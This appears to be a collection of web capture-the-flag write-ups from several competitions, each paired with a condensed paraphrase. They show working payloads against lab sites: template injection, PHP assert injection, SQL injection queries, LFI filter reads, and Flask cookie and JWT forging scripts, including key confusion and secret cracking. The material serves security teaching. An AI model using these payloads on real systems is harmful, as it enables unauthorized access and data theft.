Gargamel stole the key to decrypt The Smurfs ciphertext. Now they can't get into their kingdom to view their flag. Can you help them get the right key?

## Solution
This challenge gives you a file named `cipher` and the source code used to return the flag. Your goal is to reverse engineer the source code to create, and upload, the key that will allow the flag to be returned. This challenge requires you to exploit PHP loose comparison. In PHP versions less than 8 using `==` will loosly compare variables of different types, allowing expressions to implicitly evaluate to true. Any string (i.e. `password.txt`) compared with the integer `0` will evaluate to `true`. By making `to_check` equal to `0` we can echo the flag.

A table showing all of the PHP loose comparison values can be found [here](https://www.php.net/manual/en/types.comparisons.php).

1. In order to get the flag we need to ensure that `$to_check` is `0` to exploit PHP using loose comparison.
2. Create a 8 byte file that is equivalent to the the data in `cipher + 0xd34db33f` and upload it.
    * Your key will be XORed with `cipher + 0xd34db33f`. If they are equivalent then the XOR result will be zero.
3. The if statement will be `0 == ""whatever the password is""` which evaluates to true, and the flag will be echoed back.

## Flag
magpie{l0053_c0mp4r150n_l34d5_t0_tr0ub13}","This challenge gives you a file named `cipher` and the source code used to return the flag. Your goal is to reverse engineer the source code to create, and upload, the key that will allow the flag to be returned. This challenge requires you to exploit PHP loose comparison. In PHP versions less than 8 using `==` will loosly compare variables of different types, allowing expressions to implicitly evaluate to true. Any string (i.e. `password.txt`) compared with the integer `0` will evaluate to `true`. By making `to_check` equal to `0` we can echo the flag.

A table showing all of the PHP loose comparison values can be found [here](https://www.php.net/manual/en/types.comparisons.php).

1. In order to get the flag we need to ensure that `$to_check` is `0` to exploit PHP using loose comparison.

2. Create a 8 byte file that is equivalent to the the data in `cipher + 0xd34db33f` and upload it.
Your key will be XORed with `cipher + 0xd34db33f`. If they are equivalent then the XOR result will be zero.

3. The if statement will be `0 == ""whatever the password is""` which evaluates to true, and the flag will be echoed back.
"
"# Magpie2022 - Blame the Intern
### Category: Web
### Author: Josh Novak (rm -rf /)
---
## Description
""It was the intern"" said Jimmy. His boss was not happy. A vulnerable web application was hosted on company servers. See if you can find the flag using the interns app.

---
## Hints
1. Luckily, the intern was vaccinated. He got his INJECTION recently.

---
## Solution
1. Download app.py and examine the render function
2. Determine that template injection is possible when passing things in the textbox
3. Input `{{ state.flag }}` (you could also do `{{ state }}` and get the flag)

---
## Flag
magpie{tr34t_y0ur_1nt3rn5_n1c3ly}
","Hint: ""Luckily, the intern was vaccinated. He got his INJECTION recently.""

1. Download app.py and examine the render function

2. Determine that template injection is possible when passing things in the textbox

3. Input `{{ state.flag }}` (you could also do `{{ state }}` and get the flag)
"
"# Last Act of Defiance

### Category: Web Exploitation
### Author: Greg Vance (Expergefied)

## Description
We received a message from the founder of Flag West. They said that there was one flag that they were able to hide before Mom & Pops got them all. The message said that it is hidden somewhere in the website, and that you just need to inspect it a little. Flag West was one of the first aquisitions that Mom & Pops made, so it is surprising to hear that there still might be a flag left. Get in there and find that flag, make Flag West's last act of defiance worth something.

## Hints
1. Use Dirb

## Solution
1. The flag is broken up into three parts that can be found by inspecting the code.
2. The first part is found as a comment within the HTML.
3. The second part of the flag is found as a comment in the style.css file
4. By using Dirb the thrird part of the flag can be found in the path academic/developers/secrets/final.txt
5. Combine all of the parts for the full flag submission

## Flag
magpie{w3_5pi7_1n_7h3_f4c3_0f_7yr4nny}
","Description: ""We received a message from the founder of Flag West. They said that there was one flag that they were able to hide before Mom & Pops got them all. The message said that it is hidden somewhere in the website, and that you just need to inspect it a little. Flag West was one of the first aquisitions that Mom & Pops made, so it is surprising to hear that there still might be a flag left. Get in there and find that flag, make Flag West's last act of defiance worth something.""

Hint: ""Use Dirb""

1. The flag is broken up into three parts that can be found by inspecting the code.

2. The first part is found as a comment within the HTML.

3. The second part of the flag is found as a comment in the style.css file

4. By using Dirb the thrird part of the flag can be found in the path academic/developers/secrets/final.txt

5. Combine all of the parts for the full flag submission
"
"# Old Family Recipe

### Category: Web Exploitation
### Author: Joshua Cordeiro-Zebkowitz (Rasenha)

## Description
Your team has uncovered an old admin login page that Mom & Pops Flag Shop used to run back in the day. They overhauled their website after buying up all those other shops, but rumour has it that an old family flag was left behind. Forge a path, find the flag, and enjoy your baked goods.

## Hints
1. Ever had to forge a signature? Flask gives you good practice.

## Solution

1. When you first enter the site, you'll be met with a login page. Try and login using username: admin and password: admin. (Could change these for anything, doesn't really matter).

2. You'll then see a page saying that the login was incorrect, and to visit one of Mom & Pops' recently acquired companies. In here are a few random names, but one points to 'Robots.txt'.

3. Go to the robots.txt page for the site and you'll find that it tells you that your browser is unsupported and point you towards Internet Explorer 6.01.

3. The User-Agent for IE 6.01 is ""Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)"" (from http://www.useragentstring.com/index.php?id=7730)

4. Next you can change your browser's user-agent by (in chromium):
    - Go to 'Inspect'
    - Click on the 3 dots in the right-hand corner
    - 'More Tools'
    - 'Network Conditions'
    - Uncheck 'Use browser default'
    - Enter the User-Agent for IE 6.01

5. Now, reload the page with the new user-agent and you'll find:

```
User-agent: *
Disallow: 
# Dear Pop,
# It was awfully nice of those kinda fellas at Omni to help us out with our website, they told me
# to give them some sorta secret key for the cookies, sounds like they could use a good ol' family recipe.
# Would you be able to pass this secret key onto them?

# flour_sugar_chocolate_and_lotsalove

# Love,
# Mom

# P.S. I think they may be lost in the giggle juice, talking about their flasks...
```

6. There are some interesting words in here that might catch your eye and that relate to websites: cookies, flasks, and secret keys. If you're familiar with flask and how its session cookies work, you'll know that it signs them rather than encrypting, and to do this a ""secret key"" is used. If not, googling the key terms should get you a page like this one: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

7. Now you have a the secret key by which the cookies of this site are made: flour_sugar_chocolate_and_lotsalove. To obtain your current cookie, you could use 'Inspect' -> Storage -> Cookies and get the value. This is a Base64 encoding of the session data, a time stamp, and a cryptographic hash.

8. You can decode the cookie to obtain the session data with a tool like cyberchef: https://gchq.github.io/CyberChef/.

```
E.g.

eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiYWRtaW4ifQ.Ya2IDw.nr-R-kOeBryBOrcb6Pp0n8oKSq4

Becomes

{""admin"":false,""username"":""admin""}..Ø.ð.´d9àkÈ.«q¾.§Iü ¤ªä

```

9. Since this is the admin account you're trying to access, you probably want to set the 'admin' field to 'true'. Unfortunately, you can't just change it to 'true' and send it off in a POST request because Flask still has the SHA1 hash which is based on the session data, the timestamp, and the secret key. Fortunately, Mom's leaked email gave you the secret key!

10. To craft the session cookie, that previous site (https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) gives a good script, into which you just need to add the secret key and some session data for setting admin to true.

```
import hashlib
from flask import Flask
from itsdangerous import TimestampSigner, URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

session = {""admin"":True,""username"":""admin""}

def solve():
    s = URLSafeTimedSerializer(
        secret_key='flour_sugar_chocolate_and_lotsalove',
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    )
    return s.dumps(session)
```

11. Running this script will give the new session cookie, which you can send to the site by intercepting an HTTP request/using a cookie editor tool.

12. Press 'login' on the login page once that new cookie's been put in and VOILA! The Flag!

## Flag
magpie{d3l1c10u5_h0m3m4d3_c00k1e5}
","Description: ""Your team has uncovered an old admin login page that Mom & Pops Flag Shop used to run back in the day. They overhauled their website after buying up all those other shops, but rumour has it that an old family flag was left behind. Forge a path, find the flag, and enjoy your baked goods.""

Hint: ""Ever had to forge a signature? Flask gives you good practice.""

1. When you first enter the site, you'll be met with a login page. Try and login using username: admin and password: admin. (Could change these for anything, doesn't really matter).

2. You'll then see a page saying that the login was incorrect, and to visit one of Mom & Pops' recently acquired companies. In here are a few random names, but one points to 'Robots.txt'.

3. Go to the robots.txt page for the site and you'll find that it tells you that your browser is unsupported and point you towards Internet Explorer 6.01.
The User-Agent for IE 6.01 is ""Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)"" (from http://www.useragentstring.com/index.php?id=7730)

4. Next you can change your browser's user-agent by (in chromium):
- Go to 'Inspect'
- Click on the 3 dots in the right-hand corner
- 'More Tools'
- 'Network Conditions'
- Uncheck 'Use browser default'
- Enter the User-Agent for IE 6.01

5. Now, reload the page with the new user-agent and you'll find:
[Message from robots.txt with secret key: flour_sugar_chocolate_and_lotsalove]

6. There are some interesting words in here that might catch your eye and that relate to websites: cookies, flasks, and secret keys. If you're familiar with flask and how its session cookies work, you'll know that it signs them rather than encrypting, and to do this a ""secret key"" is used. If not, googling the key terms should get you a page like this one: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

7. Now you have a the secret key by which the cookies of this site are made: flour_sugar_chocolate_and_lotsalove. To obtain your current cookie, you could use 'Inspect' -> Storage -> Cookies and get the value. This is a Base64 encoding of the session data, a time stamp, and a cryptographic hash.

8. You can decode the cookie to obtain the session data with a tool like cyberchef: https://gchq.github.io/CyberChef/.
[Decoded example: {""admin"":false,""username"":""admin""}]

9. Since this is the admin account you're trying to access, you probably want to set the 'admin' field to 'true'. Unfortunately, you can't just change it to 'true' and send it off in a POST request because Flask still has the SHA1 hash which is based on the session data, the timestamp, and the secret key. Fortunately, Mom's leaked email gave you the secret key!

10. To craft the session cookie, that previous site (https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) gives a good script, into which you just need to add the secret key and some session data for setting admin to true.
[Python script: Craft the session cookie with secret key and session data]

11. Running this script will give the new session cookie, which you can send to the site by intercepting an HTTP request/using a cookie editor tool.

12. Press 'login' on the login page once that new cookie's been put in and VOILA! The Flag!
"
"# Chocolate Chips with Zero-G

### Category: Web Exploitation
### Author: Greg Vance (Expergefied)

## Description

Hello W-Team,

Recon has found an old website from OmniFlags. We think there may be an insecure admin portal somewhere. See if there is anything you can find! They never did hire the best developers.

Report back, \
HQ

## Hints
1. Beep Boop, now where did we put that page again?
2. Cookies are stored locally, like in a cookie jar or something...

## Solution
1. The admin.html page needs to be found. There is an invisible link in the nav-bar. Robots.txt mentions /admin.html, or it can be seen when inspecting the code.
2. Once the admin login page is found, then you need to attempt to login. At this point a cookie is generated.
3. By checking the cookie, we can see that we have an admin cookie set to false. If the value is changed to 'true' the page will redirect to the flag.

## Flag
magpie{bu7-7h3-m1Lk-ju57-fl04T5-4W4y!}
","Description: ""Hello W-Team, Recon has found an old website from OmniFlags. We think there may be an insecure admin portal somewhere. See if there is anything you can find! They never did hire the best developers.""

Hints:
1. ""Beep Boop, now where did we put that page again?""
2. ""Cookies are stored locally, like in a cookie jar or something...""

1. The admin.html page needs to be found. There is an invisible link in the nav-bar. Robots.txt mentions `/admin.html`, or it can be seen when inspecting the code.

2. Once the admin login page is found, then you need to attempt to login. At this point a cookie is generated.

3. By checking the cookie, we can see that we have an admin cookie set to false. If the value is changed to 'true' the page will redirect to the flag.
"
"# Education Comes First
### Category: Web Exploitation
### Dificulty: Easy
### Author: Auric Adubofour-Poku (AJay)

## Description

**URGENT**  W-Team,

An OmniFlags educational website has been hacked by one of the captives in the space prison, who we believe has left a message for us. Can you find it?

Good luck, \
HQ

## Hints
1. Someone had to add code to cause the flash on the screen. I wish we could stop this code from executing.

## Solution
When the website is first loaded, it can be seen that there is a flag that quickly changes to the omni flags logo after less than a second. Reloading this page will show the flash of the flag again but it is not fully readable. In order to keep the flag on the screen to make it readable, you need to:

1. Inspect the page
2. Navigate to the sources tab and open the javascript file
3. Create a breakpoint in this javascript file
4. Reload the page and the flag will stay on the screen.

## Flag
magpie{W3_R_S71LL_H3R3}

","Description: ""**URGENT**  W-Team, An OmniFlags educational website has been hacked by one of the captives in the space prison, who we believe has left a message for us. Can you find it?""

Hint: ""Someone had to add code to cause the flash on the screen. I wish we could stop this code from executing.""

When the website is first loaded, it can be seen that there is a flag that quickly changes to the omni flags logo after less than a second. Reloading this page will show the flash of the flag again but it is not fully readable. In order to keep the flag on the screen to make it readable, you need to:

1. Inspect the page

2. Navigate to the sources tab and open the javascript file

3. Create a breakpoint in this javascript file

4. Reload the page and the flag will stay on the screen.
"
"## pay2win (Web-200)

> Writeup by rnehra01(Ravinder Nehra)

### Description
Do you have enough money to buy the flag?

### Solution
So the challenge was an easy one. `Cheap` can be bought by entering a valid credit card but purchase failed for `flag`. After looking at the challenge for a very long time, `data` parameter in the URL looked suspicious.

[`data` during buying of `flag`]
```
f1=5e4ec20070a567e0e3408e92be677178ee8cbd062a60582b4f75c9736d3b8e0641e7995bb92506da1ac7f8da5a628e19ae39825a916d8a2f
f2=5e4ec20070a567e0e3408e92be677178d238c1d6d01839664f75c9736d3b8e0641e7995bb92506da1ac7f8da5a628e19ae39825a916d8a2f 
```
[`data` contents during buying of `cheap`]
```
c1=5e4ec20070a567e0e3408e92be6771789c68e186a73ad0df3b5b0554edda4f8828df361f896eb3c3706cda0474915040
c2=5e4ec20070a567e0e3408e92be677178ae6633fbd9d624ff3b5b0554edda4f8828df361f896eb3c3706cda0474915040
c3=5e4ec20070a567e0e3408e92be677178a1e8f028a2ce7c2a3b5b0554edda4f8828df361f896eb3c3706cda0474915040
```
[`data` contents after failed purchase]
```
ff1=232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3de871eef719f5fde02f7ef761e2bbe791
ff2=232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791
```
[`data` contents after successful purchase]
```
cp1=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8dca8a210beb51eda28df361f896eb3c3706cda0474915040
cp2=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c86117e55fc22ad33f28df361f896eb3c3706cda0474915040
cp3=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c81f381a6fcd665bdb28df361f896eb3c3706cda0474915040
```

So, three successful purhases of `cheap` gave same prefix and prefix changed in unsuccessful purchase.
Also suffix of `c1` and `cp1` are same, so most probably they contain information about `product name` and suffix contain `purchase status` 

Initially I tried to decode the data contents but got no luck.
So I just tried to brute-force the prefix using the script.

```
import requests

#failed purchase for flag
ff='232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791'
#good purchase for cheap
cp='5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8dca8a210beb51eda28df361f896eb3c3706cda0474915040'

url = 'http://78.46.224.78:5000/payment/callback?data='

for i in range(0,50):
	data = cp[:i]+ff[i:]
	print 'Trying : ',url+data
	r=requests.get(url+data)
	
	if (r.status_code == 200):
		print r.text
		if ('flag' in r.text):
			break
```

And got the flag at `http://78.46.224.78:5000/payment/callback?data=5765679f0870f4309b1a3c83588024d7650c1ed0fa0a08f661c6c60fea312a3d272d81aff52de2a52f7ef761e2bbe791`

Flag : `33C3_3c81d6357a9099a7c091d6c7d71343075e7f8a46d55c593f0ade8f51ac8ae1a8`
","So the challenge was an easy one. `Cheap` can be bought by entering a valid credit card but purchase failed for `flag`. After looking at the challenge for a very long time, `data` parameter in the URL looked suspicious.
[`data` during buying of `flag`]
[`data` contents during buying of `cheap`]
[`data` contents after failed purchase]
[`data` contents after successful purchase]

So, three successful purhases of `cheap` gave same prefix and prefix changed in unsuccessful purchase.
Also suffix of `c1` and `cp1` are same, so most probably they contain information about `product name` and suffix contain `purchase status` 

Initially I tried to decode the data contents but got no luck.
So I just tried to brute-force the prefix using the script.
[Python script: Brute-force the prefix by trying various combinations of the data from failed and successful purchases]

And obtained the flag URL.
"
"# Web 125 - MFW

> Writeup by f0xtr0t (Jay Bosamiya)

A quick look at the website's `.git` folder shows that we can access files such as `.git/HEAD` etc, but the directory wasn't directly browsable or clonable, so by using [dumper from GitTools](https://github.com/internetwache/GitTools). Looking through the repo and the files, the `flag.php` file doesn't have the flag, and no history information that has the file. Hence, I thought I should look at the source, and figure out a flaw that can be used on the server.

I was kinda stuck for a while, until @captn3m0 (Nemo) told me that the asserts (in [index.php](git-folder/index.php)) were in strings. Obviously, there was some sort of eval being done on the string.

So, using the page string as `' and die(show_source('templates/flag.php')) or '`, the assert would cause the source of the `flag.php` file to be revealed, which it did :)

BTW, the URL to run that page was `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27`

Fun challenge overall :) Goes on to show that one should NEVER let user input be `eval`d in any way. [This stackoverflow answer](https://stackoverflow.com/questions/3115559/exploitable-php-functions) has a nice list of all the executable pathways in PHP.
","A quick look at the website's `.git` folder shows that we can access files such as `.git/HEAD` etc, but the directory wasn't directly browsable or clonable, so by using [dumper from GitTools](https://github.com/internetwache/GitTools). Looking through the repo and the files, the `flag.php` file doesn't have the flag, and no history information that has the file. Hence, I thought I should look at the source, and figure out a flaw that can be used on the server.

I was kinda stuck for a while, until @captn3m0 (Nemo) told me that the asserts (in [index.php](git-folder/index.php)) were in strings. Obviously, there was some sort of eval being done on the string.

So, using the page string as `' and die(show_source('templates/flag.php')) or '`, the assert would cause the source of the `flag.php` file to be revealed, which it did :)

BTW, the URL to run that page was `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27`

Fun challenge overall :) Goes on to show that one should NEVER let user input be `eval`d in any way. [This stackoverflow answer](https://stackoverflow.com/questions/3115559/exploitable-php-functions) has a nice list of all the executable pathways in PHP.
"
"# Web 200 - URL Anonymizer

> Writeup by f0xtr0t (Jay Bosamiya)

One of the different admin pages (namely, `report`), was vulnerable to an SQL injection from the `id` parameter. This allowed us to leak one value of one column of information directly to the output.

Additionally, it was easy to notice that it was using MySQL. Hence, we could use the different ""special tables"" in MySQL with a `UNION SELECT` based query and obtain information.

The most irritating part of this process was finding the number of columns in the union select attack, since (for some reason), my extensions on Firefox were messing up, and I was constantly forced to manually keep running URLencode and URLdecode :(

Nevertheless, using `group_concat()`, it is possible to obtain all entries in a column, as a single row, and we used that to obtain information in a very fast way.

Without further ado, here are the different queries that were run (URLdecoded versions, for easier reading):

```
http://10.13.37.12/admin.php?page=report&id=asd"" UNION SELECT 0,1,2,3 -- 

http://10.13.37.12/admin.php?page=report&id=asd"" UNION SELECT 0,1,group_concat(table_name),3 FROM information_schema.tables where table_schema=""web"" -- 

http://10.13.37.12/admin.php?page=report&id=asd"" UNION SELECT 0,1,group_concat(column_name),3 FROM information_schema.columns where table_schema=""web"" -- 

http://10.13.37.12/admin.php?page=report&id=asd"" UNION SELECT 0,1,group_concat(flag),3 FROM flag -- 
```

The `flag` column in the `flag` table had the flag :)","One of the different admin pages (namely, `report`), was vulnerable to an SQL injection from the `id` parameter. This allowed us to leak one value of one column of information directly to the output.

Additionally, it was easy to notice that it was using MySQL. Hence, we could use the different ""special tables"" in MySQL with a `UNION SELECT` based query and obtain information.

The most irritating part of this process was finding the number of columns in the union select attack, since (for some reason), my extensions on Firefox were messing up, and I was constantly forced to manually keep running URLencode and URLdecode :(

Nevertheless, using `group_concat()`, it is possible to obtain all entries in a column, as a single row, and we used that to obtain information in a very fast way.

Without further ado, here are the different queries that were run (URLdecoded versions, for easier reading):
[A query to determine the number of columns in the UNION SELECT attack]
[A query to obtain table names from the information_schema.tables]
[A query to obtain column names from the information_schema.columns]
[A query to retrieve the flag from the flag column in the flag table]

The `flag` column in the `flag` table had the flag.
"
"## Irish Home (Web-200)

### Description
Login, and recover the deleted flag. 

### Solution
This challenge is solved by me and @nikhil96sher(Nikhil Sheorem)
The site (http://ctf.sharif.edu:8082/login.php) is vulnearable to sql injection.
But they have applied filters on the `""`.
So I used username = `\` and password = ` OR 1=1;#` and I was able to login as **admin**.
Now I was kinda stuck unless @nikhil96sher pointed out that it is vulnearable to LFI as well.
Using `http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../delete`, we got 
```
<?php
require_once('header.php');

/*
if(isset($_GET['page'])) {
    $fname = $_GET['page'] . "".php"";
    $fpath = ""pages/$fname"";
    if(file_exists($fpath)) {
        rename($fpath, ""deleted_3d5d9c1910e7c7/$fname"");
    }
}
*/

?>
<div style=""text-align: center;"">
<h3 style=""color: red;"">Site is under maintenance 'til de end av dis f$#!*^% SharifCTF.</h3><br/>
<h4><b>Al' destructive acshuns are disabled!</b></h4>
</div>
<?php
require_once('footer.php');
?>

```

After that using `http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag`, we got 
```
$username = 'Cuchulainn';
$password = ;    // Oi don't save me bleedin password in a shithole loike dis.

$salt = 'd34340968a99292fb5665e';

$tmp = $username . $password . $salt;
$tmp = md5($tmp);

$flag = ""SharifCTF{"" . $tmp . ""}"";
echo $flag;

```

Now using the [script](./web-200.py), we were able to brute-force password.
So this was the challenge which had all fruits in the basket, we had sqli, LFI, path transversal, blind sqli. 


","`/login.php` is vulnearable to sql injection.
However, filters were applied on the double quotes. By using a specific username and password combination, they were able to bypass the filter and log in as admin.

After logging in, the teammate pointed out that the site was also vulnerable to Local File Inclusion (LFI). They used an LFI technique to access a PHP script:
[PHP script: the site is under maintenance and all destructive actions are disabled]

Next, they used another LFI technique to access a PHP script containing the flag, but the password was missing. The PHP script had a username, a salt value, and an empty password field.
[PHP script: Generate the flag using the username, password, and salt]

Now using a Python script, we were able to brute-force the password.
[Python script: Brute-force the password]

So, this was the challenge which had all fruits in the basket, we had sqli, LFI, path transversal, blind sqli.
"
"# Challenge Title: Web-1

## Description
May the cURL be with you xD

Flag format: darkCTF{FLAG}

[Link](http://web1.darkarmy.xyz/)

## Solution

On opening the link the site says *to login move to /login by post and send json request* and as the description say to use cURL so lets start with it 

```
curl -X POST http://web1.darkarmy.xyz/ -H 'content-type: application/json' --data '{""user"":""karma"",""pass"":""karma""}'
```
In return, we get a jwt token

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/login1.JPG)

Used [jwt.io](https://jwt.io/) to decode that token which had payload like this `{""user"":""guest""}`.So what now?

Always check robots.txt of all web challs in any CTF because sometime it may have some data which can be useful.

Just like in this chall accessing `/robots.txt` we get `/flag` page

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/robots1.JPG)

We cant make a GET request to `/flag` so maybe POST?

On making a POST request to `/flag` we get something like this `gimme token and I will give you the flag`

On passing the jwt token which we got earlier we get a response like this `Not the admin, no flag for you`. So it needs admin token, well we can edit the token to `{""user"":""admin""}` using [jwt.io](https://jwt.io/) and passing that token to `/flag` we get the flag

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/flag1.JPG)

flag -> `darkCTF{345y_p345y_JWTs}`

## What was the Bug?
In this chall I was just checking the decoded value to have value of `user` to be `admin` (`{""user"":""admin""}`) to show to the flag thats it, the code was not checking for any signature verification","On opening the link the site says *to login move to /login by post and send json request* and as the description say to use cURL so lets start with it.
[Send an HTTP POST request using cURL with JSON data containing a username and password]

In return, we get a jwt token. Used [jwt.io](https://jwt.io/) to decode that token which had payload like this `{""user"":""guest""}`. So what now?

Always check `robots.txt` of all web challs in any CTF because sometime it may have some data which can be useful.
Just like in this chall accessing `/robots.txt` we get `/flag` page.

We can't make a GET request to `/flag`, so maybe POST?
On making a POST request to `/flag` we get something like this ""gimme token and I will give you the flag"".

On passing the jwt token which we got earlier we get a response like this `Not the admin, no flag for you`. So it needs admin token, well we can edit the token to `{""user"":""admin""}` using [jwt.io](https://jwt.io/) and passing that token to `/flag` we get the flag.

What was the Bug? In this chall I was just checking the decoded value to have value of `user` to be `admin` (`{""user"":""admin""}`) to show to the flag thats it, the code was not checking for any signature verification.
"
"# Challenge Title: Web-2

## Description
Okay this time I added the login form and I m verifying the tokens too

Flag format: darkCTF{FLAG}

[Link](http://web2.darkarmy.xyz/)

## Solution

On opening the link we see a login form, log in with any junk user and pass we get redirected to `/flag` which says `Not admin, no flag for you` hmmm...

On checking cookies we see there is key `token` with some value which is JWT again xD, checking it on [jwt.io] get this

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/token2.JPG)

The token is using RS256 algorithm which means it needs a private key and a public key 

On accessing `/robots.txt` and a little bit of scrolling xD we see there is some PRIVATE KEY   

So we have the private key now then we can build a token and apply the signature to it. I used nodejs jsonwebtoken to do this stuff 

```
const jwt = require('jsonwebtoken')
var fs = require('fs')
var private_key = fs.readFileSync('./private_key.key');
var token = jwt.sign({ 'user': 'admin' },private_key, { algorithm:'RS256',noTimestamp:true}); 
console.log(token)
```
![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/node2.JPG)

Now access the /flag using the token as cookie and we get the flag

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/flag2.JPG)

flag -> `darkCTF{n07_4_900d_p14c3_f0r_prv473k3y}`

## What was the Bug?
Hide your private key xD","On opening the link we see a login form, log in with any junk user and pass we get redirected to `/flag` which says `Not admin, no flag for you` hmmm...

On checking cookies we see there is key `token` with some value which is JWT again xD, checking it on [jwt.io] get this

The token is using RS256 algorithm which means it needs a private key and a public key 

On accessing `/robots.txt` and a little bit of scrolling xD we see there is some PRIVATE KEY.

So we have the private key now then we can build a token and apply the signature to it. I used nodejs `jsonwebtoken` library to do this stuff:
[Node.js script: Sign JWT token with private key]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was that the private key was not properly hidden.
"
"# Challenge Title: Web-3

## Description
Ahh you solved the 1st and 2nd part, let's see if you can confuse the web to get the flag

Flag format: darkCTF{FLAG}

[Link](http://web3.darkarmy.xyz/)

## Solution

From the description, it suggests about the jwt key confusion attack.

Log in with junk value, check cookies, use [jwt.io](http://jwt.io) on token value 

On checking cookies we see there is key `token` with some value, checking it on [jwt.io]() get this

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/token3.JPG)

The token is using RS256 algorithm, on accessing `/robots.txt` we see there is some public key

So seeing the description we know it should be jwt confusion attack which is changing the `Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm`

So we need to build an HMAC(HS256) token using the public key as a secret to it. I used nodejs jsonwebtoken to do this stuff 

```
const jwt = require('jsonwebtoken')
var fs = require('fs')
var publicKey = fs.readFileSync('./public_key.key');
var token = jwt.sign({ 'user': 'admin' }, publicKey, { algorithm:'HS256',noTimestamp:true});
console.log(token)
```
![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/node3.JPG)

Now access the /flag using the token as cookie and we get the flag

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/flag3.JPG)

flag -> `darkCTF{5m007h_724n51710n_45ym_2_5ymm}`

## What was the Bug?
At encoding jwt token the code was only using RS256 algorithm but at the time of verifying token it was using RS256 and HS256 both algorithm","From the description, it suggests about the jwt key confusion attack.

Log in with junk value, check cookies, use [jwt.io](http://jwt.io) on token value 

On checking cookies we see there is key `token` with some value, checking it on [jwt.io]() get this

The token is using RS256 algorithm, on accessing `/robots.txt` we see there is some public key.

So seeing the description we know it should be jwt confusion attack which is changing the `Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm`

So we need to build an HMAC(HS256) token using the public key as a secret to it. I used nodejs `jsonwebtoken` library to do this stuff:
[Node.js script: Sign JWT token with public key as secret and use HS256 algorithm]

Now access the `/flag` using the token as cookie and we get the flag

The bug in this challenge was that, at the time of encoding the JWT token, the code was only using the RS256 algorithm, but during verification, it was using both RS256 and HS256 algorithms.
"
"# Challenge Title: Web-4

## Description
This time I have made sure that no secrets will be public but I still think its too weak.

Flag format: darkCTF{FLAG}

[Link](http://web4.darkarmy.xyz/)

## Solution

Seeing the description we know it should be related to jwt secret brute-forcing, anyway, let's start with it

Log in with junk value, check cookies, use [jwt.io](http://jwt.io) on token value 

On checking cookies we see there is key `token` with some value, checking it on [jwt.io]() get this

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/token4.JPG)

The token is using HS256algorithm with means it is using a secret_key for encryption, on accessing `/robots.txt` we see nothing now xD

So seeing the description we know it should be related to brute-forcing for secret_key as there is nothing else xD

To do that I used  this tool [jwt_tool](https://github.com/ticarpi/jwt_tool) with `rockyou.txt`

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.1mGqtRViJqKA-TYFeNCcSkgLinKt9CgBnGxjL9KXtNA

```

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/bf.JPG)

Now we have the secret_key which is `redraider`

So now we build a token of HS256 with secret_key as `redraider` with value of user as admin.

```
const jwt = require('jsonwebtoken')
var token = jwt.sign({ 'user': 'admin' },'redraider', { algorithm:'HS256',noTimestamp:true}); 
```
![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/node4.JPG)

Now access the /flag using the token as cookie and we get the flag

![alt text](https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Images/flag4.JPG)

flag -> `darkCTF{5ymm37r1c_k3y_cr4ck1n9}`

## What was the Bug?
Don't use secret which can be cracked by bruteforcing it
","Seeing the description we know it should be related to jwt secret brute-forcing, anyway, let's start with it

Log in with junk value, check cookies, use [jwt.io](http://jwt.io) on token value 

On checking cookies we see there is key `token` with some value, checking it on jwt.io get this

The token is using HS256algorithm with means it is using a secret_key for encryption, on accessing `/robots.txt` we see nothing now xD

So seeing the description we know it should be related to brute-forcing for secret_key as there is nothing else xD

To do that I used  this tool [jwt_tool](https://github.com/ticarpi/jwt_tool) with `rockyou.txt`
[Command: Run jwt_tool with the target JWT token]

Now we have the secret_key which is `redraider`
So now we build a token of HS256 with secret_key as `redraider` with value of user as admin.
